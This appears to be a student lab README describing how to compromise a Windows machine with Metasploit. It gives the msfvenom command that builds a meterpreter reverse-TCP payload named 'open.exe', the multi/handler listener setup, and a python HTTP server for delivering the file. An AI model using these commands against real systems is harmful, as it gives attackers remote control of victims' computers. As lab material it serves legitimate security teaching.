# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.66.29 LPORT=1234 --platform=windows -f exe>open.exe```

```msfconsole -q```

```set PAYLOAD windows/meterpreter/reverse_tcp```

```use exploit/multi/handler```

```set LHOST 192.168.66.29```

```set LPORT 1234```

```run```

## OUTPUT

![440704157-e9635a54-219d-4435-9247-440690254853](https://github.com/user-attachments/assets/8712c1d5-fdc1-42fb-970e-952023c727fa)

```python3 -m http.server 5678```

## OUTPUT

![440704260-da793e31-df02-4d4a-8387-9bd2557df737](https://github.com/user-attachments/assets/316690b4-b1af-44b2-9883-afbd20f44f5e)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
